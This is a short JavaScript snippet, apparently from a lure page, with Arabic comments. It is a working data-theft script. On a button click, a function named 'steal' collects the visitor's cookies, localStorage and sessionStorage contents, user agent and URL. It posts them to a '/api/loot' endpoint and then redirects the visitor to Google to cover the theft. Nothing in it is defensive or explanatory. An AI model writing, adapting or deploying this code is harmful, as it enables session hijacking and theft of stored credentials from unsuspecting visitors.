(()=>{
const steal=async()=>{
  console.log('🖱️ Button clicked – starting steal...');

  const بيانات={
    cookie:document.cookie,
    local:Object.entries(localStorage),
    session:Object.entries(sessionStorage),
    ua:navigator.userAgent,
    url:location.href,
    time:new Date().toISOString()
  };
  console.log('📦 Data collected:', بيانات);

  // الآن نُرسل إلى الدالة
  const res=await fetch('/api/loot',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(بيانات)
  });
  console.log('📬 Fetch response status:', res.status);

  // بعد الإرسال نُوجّه
  location.replace('https://www.google.com');
};
document.getElementById('enterBtn').addEventListener('click',steal,{once:true});
})();
